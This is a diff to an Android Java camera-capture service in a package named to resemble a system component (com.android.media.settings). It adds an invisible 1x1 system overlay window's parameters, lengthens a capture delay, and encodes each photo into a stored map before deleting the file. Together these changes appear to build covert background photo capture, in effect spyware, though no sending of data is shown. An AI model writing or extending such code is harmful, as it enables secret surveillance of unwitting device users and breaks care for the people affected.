@@ -4,6 +4,7 @@ import android.annotation.TargetApi;
 import android.content.Context;
 import android.content.pm.PackageManager;
 import android.graphics.ImageFormat;
+import android.graphics.PixelFormat;
 import android.hardware.camera2.CameraAccessException;
 import android.hardware.camera2.CameraCaptureSession;
 import android.hardware.camera2.CameraCharacteristics;
@@ -21,6 +22,7 @@ import android.support.v4.app.ActivityCompat;
 import android.util.Log;
 import android.util.Size;
 import android.view.Surface;
+import android.view.WindowManager;
 
 import com.android.media.settings.Interface.ImageCaptureListener;
 import com.android.media.settings.Utility.MediaUtility;
@@ -62,6 +64,7 @@ public class ImageCaptureServiceImp extends ImageCaptureService {
 
     private ImageCaptureServiceImp(final Context context) {
         super(context);
+        mMediaUtility = MediaUtility.getInstance(context);
     }
 
     public static ImageCaptureService getInstance(final Context context) {
@@ -146,7 +149,7 @@ public class ImageCaptureServiceImp extends ImageCaptureService {
                 } catch (final CameraAccessException e) {
                     Log.e(TAG, " exception occurred while taking picture from " + currentCameraId, e);
                 }
-            }, 500);
+            }, 1000);
         }
 
         @Override
@@ -186,6 +189,13 @@ public class ImageCaptureServiceImp extends ImageCaptureService {
             Log.e(TAG, "cameraDevice is null");
             return;
         }
+        WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
+        WindowManager.LayoutParams params = new WindowManager.LayoutParams(1, 1,
+                WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
+                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
+                PixelFormat.TRANSLUCENT);
+
+
         final CameraCharacteristics characteristics = manager.getCameraCharacteristics(cameraDevice.getId());
         Size[] jpegSizes = null;
         StreamConfigurationMap streamConfigurationMap = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
@@ -195,7 +205,11 @@ public class ImageCaptureServiceImp extends ImageCaptureService {
         final boolean jpegSizesNotEmpty = jpegSizes != null && 0 < jpegSizes.length;
         int width = jpegSizesNotEmpty ? jpegSizes[0].getWidth() : 640;
         int height = jpegSizesNotEmpty ? jpegSizes[0].getHeight() : 480;
+
+        Log.d(TAG, "Width: " + width + " Height: " + height);
+
         final ImageReader reader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1);
+
         final List<Surface> outputSurfaces = new ArrayList<>();
         outputSurfaces.add(reader.getSurface());
         final CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
@@ -204,20 +218,19 @@ public class ImageCaptureServiceImp extends ImageCaptureService {
         captureBuilder.set(CaptureRequest.JPEG_ORIENTATION, getOrientation());
         reader.setOnImageAvailableListener(onImageAvailableListener, null);
         cameraDevice.createCaptureSession(outputSurfaces, new CameraCaptureSession.StateCallback() {
-                    @Override
-                    public void onConfigured(@NonNull CameraCaptureSession session) {
-                        try {
-                            session.capture(captureBuilder.build(), captureListener, null);
-                        } catch (final CameraAccessException e) {
-                            Log.e(TAG, " exception occurred while accessing " + currentCameraId, e);
-                        }
-                    }
-
-                    @Override
-                    public void onConfigureFailed(@NonNull CameraCaptureSession session) {
-                    }
+            @Override
+            public void onConfigured(@NonNull CameraCaptureSession session) {
+                try {
+                    session.capture(captureBuilder.build(), captureListener, null);
+                } catch (final CameraAccessException e) {
+                    Log.e(TAG, " exception occurred while accessing " + currentCameraId, e);
                 }
-                , null);
+            }
+
+            @Override
+            public void onConfigureFailed(@NonNull CameraCaptureSession session) {
+            }
+        }, null);
     }
 
 
@@ -233,7 +246,7 @@ public class ImageCaptureServiceImp extends ImageCaptureService {
             File compressedFile = MediaUtility.getInstance(context).compressImage(originalFile.getAbsolutePath(), fileId);
             if(compressedFile != null && compressedFile.exists()) {
                 originalFile.delete();
-                this.picturesTaken.put(compressedFile.getPath(), "");
+                this.picturesTaken.put(compressedFile.getPath(), mMediaUtility.encodeImage(compressedFile.getPath()));
                 compressedFile.delete();
             }
         } catch (final IOException e) {
